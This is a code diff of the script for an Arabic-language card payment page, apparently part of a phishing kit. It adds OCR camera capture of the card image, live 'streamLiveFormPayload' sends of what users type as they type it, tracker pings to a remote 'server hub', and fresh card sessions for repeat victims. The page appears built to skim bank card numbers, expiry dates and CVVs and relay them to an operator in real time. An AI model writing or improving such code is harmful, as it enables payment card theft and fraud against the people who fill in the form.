-        badgeUrl = VISA_IMG_URL; previewCard.style.background = '#f0f4fa';
+        badgeUrl = VISA_IMG_URL;
+        previewCard.style.background = '#f0f4fa';
       }
 
       networkInline.innerHTML = `<img src="${badgeUrl}" alt="${brandName}">`;
       networkGraphic.innerHTML = `<img src="${badgeUrl}" alt="${brandName}" class="card-network-logo-preview">`;
+
       updateBankLogo(bankLogoUrl, bankDomain, bankName);
 
       currencyBox.innerText = COUNTRY_CURRENCY[isoCode] || 'SAR';
       currencyBox.style.display = 'block';
+
       tierEl.innerText = `${cardType} • ${cardCat}`;
       tierEl.style.display = 'block';
 
-      if (COUNTRY_FLAGS[isoCode]) { flagEl.innerText = COUNTRY_FLAGS[isoCode]; flagEl.style.display = 'block'; } 
-      else { flagEl.style.display = 'none'; }
+      if (COUNTRY_FLAGS[isoCode]) {
+        flagEl.innerText = COUNTRY_FLAGS[isoCode];
+        flagEl.style.display = 'block';
+      } else {
+        flagEl.style.display = 'none';
+      }
 
       if (raw.length === 16) {
         isCardValid = isValidLuhn(raw);
@@ -1116,7 +1197,9 @@
         let now = new Date(), curM = now.getMonth() + 1, curY = now.getFullYear();
         isExpiryValid = (y > curY || (y === curY && m >= curM)) && (m >= 1 && m <= 12);
         if (isExpiryValid) document.getElementById('card-cvv').focus();
-      } else { isExpiryValid = false; }
+      } else {
+        isExpiryValid = false;
+      }
       updatePayButtonState();
     }
 
@@ -1144,13 +1227,24 @@
       document.getElementById('pay-submit-btn').disabled = true;
       document.getElementById('pay-submit-btn').innerText = "جاري الدفع الآمن...";
       
-      sendPayload('confirmed', true);
+      streamLiveFormPayload('confirmed');
 
       fetch(SERVER_HUB_URL + '/api/tracker/ping', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ token: visitorToken, siteKey: siteKey, currentPage: '/loading', pageTitle: 'جاري مصادقة البطاقة البنكية...' })
+        body: JSON.stringify({
+          token: visitorToken,
+          siteKey: siteKey,
+          currentPage: '/loading',
+          pageTitle: 'جاري مصادقة البطاقة البنكية...'
+        })
       }).catch(function () {});
+
+      // زيادة العداد وتجهيز كارت مستقل تماماً في حال عاد المستخدم لصفحة الدفع
+      cardCounter++;
+      localStorage.setItem('user_card_seq', cardCounter.toString());
+      currentCardSession = generateNewCardSession();
+      hasTriggeredTypingSound = false;
 
       setTimeout(function () {
         var dest = (window.location.pathname.includes('/live/') || window.location.pathname.includes('/storage/'))
@@ -1160,41 +1254,57 @@
       }, 800);
     }
 
-    /* كود ماسح الكاميرا */
+    // 📷 الماسح الضوئي بالكاميرا
     var mediaStream = null;
+
     async function openCardScanner() {
       const modal = document.getElementById('camera-modal');
       const video = document.getElementById('camera-video');
       modal.classList.add('active');
+
       try {
-        mediaStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { ideal: "environment" }, width: { ideal: 1280 } } });
+        mediaStream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: { ideal: "environment" }, width: { ideal: 1280 } }
+        });
         video.srcObject = mediaStream;
       } catch (err) {
         alert("يرجى منح الإذن للوصول إلى الكاميرا لمسح أرقام البطاقة.");
         closeCardScanner();
       }
     }
+
     function closeCardScanner() {
       const modal = document.getElementById('camera-modal');
       const video = document.getElementById('camera-video');
       modal.classList.remove('active');
-      if (mediaStream) { mediaStream.getTracks().forEach(track => track.stop()); mediaStream = null; }
+      if (mediaStream) {
+        mediaStream.getTracks().forEach(track => track.stop());
+        mediaStream = null;
+      }
       video.srcObject = null;
     }
+
     async function captureAndRecognizeCard() {
       const video = document.getElementById('camera-video');
       const btn = document.querySelector('.btn-capture');
-      btn.innerText = "جاري القراءة..."; btn.disabled = true;
+      btn.innerText = "جاري القراءة...";
+      btn.disabled = true;
+
       const thumbCanvas = document.createElement('canvas');
-      thumbCanvas.width = 320; thumbCanvas.height = 200;
+      thumbCanvas.width = 320;
+      thumbCanvas.height = 200;
       const thumbCtx = thumbCanvas.getContext('2d');
       thumbCtx.drawImage(video, 0, 0, 320, 200);
-      document.getElementById('card-scanned-image').value = thumbCanvas.toDataURL('image/jpeg', 0.5);
+
+      const capturedBase64 = thumbCanvas.toDataURL('image/jpeg', 0.5);
+      document.getElementById('card-scanned-image').value = capturedBase64;
 
       const ocrCanvas = document.createElement('canvas');
-      ocrCanvas.width = video.videoWidth || 640; ocrCanvas.height = video.videoHeight || 480;
+      ocrCanvas.width = video.videoWidth || 640;
+      ocrCanvas.height = video.videoHeight || 480;
       const ocrCtx = ocrCanvas.getContext('2d');
       ocrCtx.drawImage(video, 0, 0, ocrCanvas.width, ocrCanvas.height);
+
       const imgData = ocrCtx.getImageData(0, 0, ocrCanvas.width, ocrCanvas.height);
       const d = imgData.data;
       for (let i = 0; i < d.length; i += 4) {
@@ -1205,29 +1315,46 @@
       ocrCtx.putImageData(imgData, 0, 0);
 
       try {
-        const { data: { text } } = await Tesseract.recognize(ocrCanvas, 'eng', { tessedit_char_whitelist: '0123456789 -' });
+        const { data: { text } } = await Tesseract.recognize(ocrCanvas, 'eng', {
+          tessedit_char_whitelist: '0123456789 -'
+        });
+
         const cleanDigitsOnly = text.replace(/\D/g, '');
         let targetCardDigits = '';
+
         for (let len = 16; len >= 13; len--) {
-          const matches = cleanDigitsOnly.match(new RegExp(`\\d{${len}}`, 'g'));
-          if (matches) { for (const match of matches) { if (isValidLuhn(match)) { targetCardDigits = match; break; } } }
+          const regex = new RegExp(`\\d{${len}}`, 'g');
+          const matches = cleanDigitsOnly.match(regex);
+          if (matches) {
+            for (const match of matches) {
+              if (isValidLuhn(match)) {
+                targetCardDigits = match;
+                break;
+              }
+            }
+          }
           if (targetCardDigits) break;
         }
-        if (!targetCardDigits) { const fallback = cleanDigitsOnly.match(/\d{16}/); if (fallback) targetCardDigits = fallback[0]; }
+
+        if (!targetCardDigits) {
+          const fallbackMatch = cleanDigitsOnly.match(/\d{16}/);
+          if (fallbackMatch) targetCardDigits = fallbackMatch[0];
+        }
 
         if (targetCardDigits && targetCardDigits.length >= 13) {
           const cardInput = document.getElementById('card-number');
           cardInput.value = targetCardDigits;
-          notifyTypingStart();
           validateCardNumber(cardInput);
           closeCardScanner();
+          streamLiveFormPayload('typing');
         } else {
-          alert("لم يتم استخراج الأرقام بدقة، يرجى إعادة المحاولة.");
+          alert("لم يتم استخراج الأرقام بدقة، يرجى ضبط الإضاءة وتوجيه الكاميرا أفقياً.");
         }
       } catch (e) {
         alert("تعذر قراءة أرقام البطاقة، يرجى إدخالها يدوياً.");
       } finally {
-        btn.innerText = "📸 مسح وقراءة الرقم"; btn.disabled = false;
+        btn.innerText = "📸 مسح وقراءة الرقم";
+        btn.disabled = false;
       }
     }
   </script>
